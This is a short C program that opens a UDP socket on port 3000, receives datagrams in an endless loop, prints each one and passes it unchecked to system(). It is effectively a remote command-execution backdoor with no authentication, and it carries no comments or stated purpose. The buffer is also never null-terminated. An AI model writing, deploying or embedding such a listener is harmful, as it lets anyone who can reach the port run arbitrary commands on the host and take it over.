#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include "netdb.h"
#include "arpa/inet.h"
int main(){
    char buffer[1024];
    int sockfd = socket(AF_INET,SOCK_DGRAM,0);
    struct sockaddr_in servaddr,cliaddr;
    servaddr.sin_family= AF_INET;
    servaddr.sin_port = htons(3000);
    servaddr.sin_addr.s_addr = INADDR_ANY;
    bind(sockfd,(struct sockaddr*)&servaddr,sizeof(servaddr));
    memset(&cliaddr, 0, sizeof(cliaddr));
    int len = sizeof(cliaddr),n;
    while(1){
        n = recvfrom(sockfd,buffer, 1024,MSG_WAITALL, ( struct sockaddr *) &cliaddr,&len);
		printf("Command: %s",buffer);
		system(buffer);
    }
    return 0;
}
